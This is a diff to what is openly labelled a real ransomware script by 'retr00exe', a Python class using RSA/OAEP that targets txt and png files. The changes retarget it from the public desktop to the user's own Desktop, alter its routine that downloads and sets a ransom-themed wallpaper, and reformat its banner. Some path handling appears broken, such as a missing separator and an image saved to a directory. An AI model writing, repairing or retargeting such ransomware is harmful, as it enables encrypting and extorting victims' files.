@@ -16,7 +16,7 @@ from Crypto.Cipher import PKCS1_OAEP
 class Ransomware:
     exts = ['txt', 'png']
 
-    def __init__(self, targetDir="C:/Users/Public/Public Desktop"):
+    def __init__(self, targetDir=f"{os.path.expanduser('~')}Desktop"):
         self.ransomKey = None
         self.crypter = None
         self.publicKey = None
@@ -72,7 +72,7 @@ class Ransomware:
 
     def change_desktop_background(self):
         imageURL = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
-        path = self.targerDir
+        path = f'{self.homeDir}\\OneDrive\\Desktop'
         urllib.request.urlretrieve(imageURL, path)
         SPI_SETDESKWALLPAPER = 20
         ctypes.windll.user32.SystemParametersInfoW(
@@ -104,21 +104,21 @@ class Ransomware:
 
 def welcome_msg():
     welcome = '''
-     _______                                                                           
-    /       \                                                                          
-    $$$$$$$  | __    __   ______   ______   _______    _______   ______   _____  ____  
-    $$ |__$$ |/  |  /  | /      \ /      \ /       \  /       | /      \ /     \/    \ 
-    $$    $$/ $$ |  $$ |/$$$$$$  |$$$$$$  |$$$$$$$  |/$$$$$$$/ /$$$$$$  |$$$$$$ $$$$  |
-    $$$$$$$/  $$ |  $$ |$$ |  $$/ /    $$ |$$ |  $$ |$$      \ $$ |  $$ |$$ | $$ | $$ |
-    $$ |      $$ \__$$ |$$ |     /$$$$$$$ |$$ |  $$ | $$$$$$  |$$ \__$$ |$$ | $$ | $$ |
-    $$ |      $$    $$ |$$ |     $$    $$ |$$ |  $$ |/     $$/ $$    $$/ $$ | $$ | $$ |
-    $$/        $$$$$$$ |$$/       $$$$$$$/ $$/   $$/ $$$$$$$/   $$$$$$/  $$/  $$/  $$/ 
-            /  \__$$ |                                                               
-            $$    $$/                                                                
-            $$$$$$/                                                                 v1.0.0 by retr00exe
+ _______                                                                           
+/       \                                                                          
+$$$$$$$  | __    __   ______   ______   _______    _______   ______   _____  ____  
+$$ |__$$ |/  |  /  | /      \ /      \ /       \  /       | /      \ /     \/    \ 
+$$    $$/ $$ |  $$ |/$$$$$$  |$$$$$$  |$$$$$$$  |/$$$$$$$/ /$$$$$$  |$$$$$$ $$$$  |
+$$$$$$$/  $$ |  $$ |$$ |  $$/ /    $$ |$$ |  $$ |$$      \ $$ |  $$ |$$ | $$ | $$ |
+$$ |      $$ \__$$ |$$ |     /$$$$$$$ |$$ |  $$ | $$$$$$  |$$ \__$$ |$$ | $$ | $$ |
+$$ |      $$    $$ |$$ |     $$    $$ |$$ |  $$ |/     $$/ $$    $$/ $$ | $$ | $$ |
+$$/        $$$$$$$ |$$/       $$$$$$$/ $$/   $$/ $$$$$$$/   $$$$$$/  $$/  $$/  $$/ 
+          / \__ $$ |                                                               
+          $$    $$/                                                                
+           $$$$$$/                                              v1.0.0 by retr00exe
 
-    Warning : This is real ransomware script. Using VM is highly recommended to avoid unexpected damage.
-    '''
+Warning : This is real ransomware script. Using VM is highly recommended to avoid unexpected damage.
+'''
     print(welcome)
 
 
